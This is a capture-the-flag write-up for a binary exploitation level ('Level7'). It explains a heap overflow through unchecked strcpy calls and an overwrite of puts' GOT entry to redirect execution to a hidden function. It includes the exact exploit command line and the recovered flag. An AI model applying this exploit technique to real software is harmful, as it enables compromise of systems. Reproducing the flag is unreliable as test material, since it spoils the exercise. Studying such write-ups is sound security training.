# Level7

We can see that the program `fgets()` the flag and saves it in `obj.c` but does nothing with it
There is however a function `m()` that prints `obj.c` but it is not called

This binary does 4 `malloc` calls in a row

It uses `strcpy` to copy the strings in `av[0]` and `av[1]` to their respective allocated memory
`strcpy` is unprotected and will copy until it reaches the end of the string of crahes

We can overflow in during the first strcpy, to overwrite the address used as destination for the second strcpy
``
#1 malloc(8)	; 0x0804A008 ; 4 bytes store index 1, following 4 store malloc #2 return
#2 malloc(8)	; 0x0804A018 ; destination of strcpy argv[0]
#3 malloc(8)	; 0x0804A028 ; 4 bytes store index 2, following 4 store malloc #4 return
#4 malloc(8)	; 0x0804A038 ; destination of strcpy argv[1] 
``

## Heap visualisation
``
#1 data		 #1 metadata	  #2 data	   #2 metadata	    #3 data	     #3 metadata      #4 data	       #4 metadata	
[][][][][][][][]|[][][][][][][][]|[][][][][][][][]|[][][][][][][][]|[][][][][][][][]|[][][][][][][][]|[][][][][][][][]|[][][][][][][][]
^        \________________________^				    ^        \________________________^
 \ index 1							     \ index 2
``

`av[0]` will have the address of puts in the GOT with 20 padding so that the address overflows into malloc #3 and replaces the address used as parameter in the second strcpy
`av[1]` will have the address to `m()` to be placed in the GOT

``
./level7 $(python -c "print 20 * 'A' + '\x08\x04\x99\x28'[::-1]") $(python -c "print '\x08\x04\x84\xf4'[::-1]")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1581869221
``
